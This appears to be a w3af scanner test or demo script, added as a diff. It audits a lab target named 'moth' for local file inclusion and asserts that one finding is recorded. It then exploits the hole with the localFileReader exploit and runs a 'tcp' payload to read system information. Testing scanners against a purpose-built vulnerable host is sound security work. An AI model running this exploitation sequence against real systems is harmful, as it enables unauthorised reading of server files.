@@ -1,0 +1,36 @@
+# This is the local file inclusion demo:
+
+plugins
+audit localFileInclude
+output console,textFile
+output config textFile
+set fileName output-w3af.txt
+#set verbose True
+back
+
+output config console
+set verbose True
+back
+
+back
+
+target
+set target http://moth/w3af/audit/local_file_read/local_file_read.php?file=section.txt
+back
+
+start
+
+assert len(kb.kb.getData('localFileInclude','localFileInclude')) == 1 
+
+exploit
+exploit localFileReader
+interact 0
+
+payload tcp
+exit
+exit
+
+
+
+
+
